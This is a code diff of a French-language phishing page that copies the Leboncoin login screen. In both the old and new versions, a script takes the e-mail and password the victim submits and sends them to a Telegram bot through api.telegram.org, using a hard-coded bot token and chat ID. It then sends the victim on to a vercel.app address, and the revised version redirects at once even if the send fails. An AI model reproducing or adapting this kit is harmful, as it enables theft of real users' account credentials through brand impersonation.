@@ -1,263 +1,219 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leboncoin - Connexion</title>
-    <style>
-        * {
-            max-width: 100%;
-            outline: none;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: white; /* Fond blanc général */
-        }
-
-        header {
-            text-align: center;
-            background: #ffffff;
-            padding-top: 20px;
-        }
-
-        .logo {
-            display: inline-block;
-        }
-
-        header img {
-            width: 190px;
-        }
-
-        main {
-            margin: 0;
-            padding: 0;
-            text-align: center;
-            background-color: white; /* Fond blanc */
-            height: 100vh;
-            display: flex;
-            justify-content: flex-start;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .continer {
-            margin-top: 20px;
-            padding: 30px;
-            display: inline-block;
-            width: 490px;
-            background: rgba(255, 255, 255, 0.8);
-            border-radius: 14px;
-            border: 4px solid #cdcfdb75;
-            position: relative;
-            z-index: 1;
-        }
-
-        .col {
-            text-align: left;
-            margin-top: 26px;
-        }
-
-        .col input {
-            width: 100%;
-            padding: 14px;
-            border-radius: 20px;
-            border: 1px solid #b2a6a6;
-            margin-top: 4px;
-        }
-
-        .tittle {
-            text-align: left;
-        }
-
-        h2 {
-            margin-top: 0px;
-            color: rgb(21 34 51);
-        }
-
-        .tittle p {
-            font-size: 0.94em;
-            margin-bottom: 10px;
-        }
-
-        .code {
-            text-align: left;
-            margin-top: 0px;
-        }
-
-        .code a {
-            font-size: 0.9em;
-            color: #000000;
-        }
-
-        .coll button {
-            width: 100%;
-            padding: 12px;
-            color: white;
-            background: #ec5a13;
-            border-radius: 20px;
-            border: none;
-            font-size: 1.09em;
-            margin-top: 32px;
-            font-weight: bold;
-        }
-
-        .bottom {
-            display: flex;
-            align-items: center;
-            margin-top: 22px;
-        }
-
-        .bottom .p {
-            display: flex;
-            align-items: center;
-            width: 63%;
-            margin-left: 38px;
-        }
-
-        .bottom .a {
-            display: flex;
-            align-items: center;
-            width: 64%;
-        }
-
-        .a a {
-            color: rgb(21 34 51);
-            font-weight: bold;
-        }
-
-        @media screen and (max-width: 800px) {
-            header img {
-                width: 140px;
-            }
-
-            .title {
-                font-weight: bold;
-                font-size: 0.9em;
-                color: black;
-                text-align: left;
-            }
-
-            main {
-                background: none;
-                margin: 0;
-            }
-
-            .continer {
-                border: none;
-            }
-
-            .bottom .p {
-                font-size: 0.8em;
-            }
-
-            .code a {
-                font-size: 0.8em;
-                color: #000000;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Leboncoin - Connexion</title>
+  <style>
+    * {
+      max-width: 100%;
+      outline: none;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: white;
+    }
+    header {
+      text-align: center;
+      background: #ffffff;
+      padding-top: 20px;
+    }
+    .logo {
+      display: inline-block;
+    }
+    header img {
+      width: 190px;
+    }
+    main {
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      background-color: white;
+      height: 100vh;
+      display: flex;
+      justify-content: flex-start;
+      flex-direction: column;
+      align-items: center;
+    }
+    .continer {
+      margin-top: 20px;
+      padding: 30px;
+      display: inline-block;
+      width: 490px;
+      background: rgba(255, 255, 255, 0.8);
+      border-radius: 14px;
+      border: 4px solid #cdcfdb75;
+      position: relative;
+      z-index: 1;
+    }
+    .col {
+      text-align: left;
+      margin-top: 26px;
+    }
+    .col input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 20px;
+      border: 1px solid #b2a6a6;
+      margin-top: 4px;
+    }
+    .tittle {
+      text-align: left;
+    }
+    h2 {
+      margin-top: 0px;
+      color: rgb(21 34 51);
+    }
+    .tittle p {
+      font-size: 0.94em;
+      margin-bottom: 10px;
+    }
+    .code {
+      text-align: left;
+      margin-top: 0px;
+    }
+    .code a {
+      font-size: 0.9em;
+      color: #000000;
+    }
+    .coll button {
+      width: 100%;
+      padding: 12px;
+      color: white;
+      background: #ec5a13;
+      border-radius: 20px;
+      border: none;
+      font-size: 1.09em;
+      margin-top: 32px;
+      font-weight: bold;
+    }
+    .bottom {
+      display: flex;
+      align-items: center;
+      margin-top: 22px;
+    }
+    .bottom .p {
+      display: flex;
+      align-items: center;
+      width: 63%;
+      margin-left: 38px;
+    }
+    .bottom .a {
+      display: flex;
+      align-items: center;
+      width: 64%;
+    }
+    .a a {
+      color: rgb(21 34 51);
+      font-weight: bold;
+    }
+    @media screen and (max-width: 800px) {
+      header img {
+        width: 140px;
+      }
+      .title {
+        font-weight: bold;
+        font-size: 0.9em;
+        color: black;
+        text-align: left;
+      }
+      main {
+        background: none;
+        margin: 0;
+      }
+      .continer {
+        border: none;
+      }
+      .bottom .p {
+        font-size: 0.8em;
+      }
+      .code a {
+        font-size: 0.8em;
+        color: #000000;
+      }
+    }
+  </style>
 </head>
 <body>
+  <header>
+    <div class="logo">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo">
+    </div>
+  </header>
 
-    <!-- En-tête avec nouveau logo -->
-    <header>
-        <div class="logo">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo">
+  <main>
+    <div class="continer">
+      <div class="tittle">
+        <h2>Bonjour !</h2>
+        <p>Connectez-vous pour découvrir toutes nos fonctionnalités.</p>
+      </div>
+
+      <form action="#" method="post" id="loginForm">
+        <div class="col">
+          <label for="user">E-mail *</label>
+          <input type="text" id="user" name="user" required autofocus>
         </div>
-    </header>
-
-    <main>
-        <div class="continer">
-            <div class="tittle">
-                <h2>Bonjour !</h2>
-                <p>Connectez-vous pour découvrir toutes nos fonctionnalités.</p>
-            </div>
-
-            <!-- Message d'erreur PHP -->
-            <?php if (isset($error)) : ?>
-                <div style="color: red; text-align: center; margin-top: 20px;">
-                    <?php echo $error; ?>
-                </div>
-            <?php endif; ?>
-
-            <!-- Formulaire de connexion -->
-            <form action="index.php" method="post" id="loginForm">
-                <div class="col">
-                    <label for="user">E-mail *</label>
-                    <input type="text" id="user" name="user" required autofocus>
-                </div>
-
-                <div class="col">
-                    <label for="pass">Mot de passe *</label>
-                    <input type="password" id="pass" name="pass" required>
-                </div>
-
-                <div class="code">
-                    <a href="#">Mot de passe oublié</a>
-                </div>
-
-                <div class="coll">
-                    <button type="submit" id="submitBtn">Se connecter</button>
-                </div>
-
-                <div class="bottom">
-                    <div class="p"><p>Envie de nous rejoindre ?</p></div>
-                    <div class="a"><a href="#">Créer un compte</a></div>
-                </div>
-            </form>
+        <div class="col">
+          <label for="pass">Mot de passe *</label>
+          <input type="password" id="pass" name="pass" required>
         </div>
-    </main>
 
-    <script>
-        // Bot Telegram
-        const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";
-        const chatId = "5601119281";
+        <div class="code">
+          <a href="#">Mot de passe oublié</a>
+        </div>
 
-        // Envoie les infos à Telegram
-        async function sendToTelegram(formData) {
-            const message = `Nouveau message depuis le formulaire :
-E-mail: ${formData.user}
-Mot de passe: ${formData.pass}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        <div class="coll">
+          <button type="submit" id="submitBtn">Se connecter</button>
+        </div>
 
-            const response = await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
+        <div class="bottom">
+          <div class="p"><p>Envie de nous rejoindre ?</p></div>
+          <div class="a"><a href="#">Créer un compte</a></div>
+        </div>
+      </form>
+    </div>
+  </main>
 
-            return response.json();
-        }
+  <script>
+    const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";
+    const chatId = "5601119281";
 
-        // Soumission du formulaire
-        document.getElementById("loginForm").addEventListener("submit", function (event) {
-            event.preventDefault();
+    async function sendToTelegram(formData) {
+      const message = `Nouveau message depuis le formulaire :\nE-mail: ${formData.user}\nMot de passe: ${formData.pass}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-            const user = document.getElementById("user").value;
-            const pass = document.getElementById("pass").value;
-
-            const formData = { user, pass };
-
-            sendToTelegram(formData)
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = "https://adresse1.vercel.app/";
-                    } else {
-                        alert("Erreur lors de l'envoi des informations.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Erreur : ", error);
-                });
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
         });
-    </script>
+      } catch (e) {
+        console.warn("Erreur lors de l'envoi à Telegram (ignorée).");
+      }
+    }
 
+    document.getElementById("loginForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const user = document.getElementById("user").value;
+      const pass = document.getElementById("pass").value;
+
+      const formData = { user, pass };
+
+      sendToTelegram(formData);
+
+      // Redirection immédiate (même si l'envoi échoue)
+      window.location.href = "https://adresse1.vercel.app/";
+    });
+  </script>
 </body>
 </html>
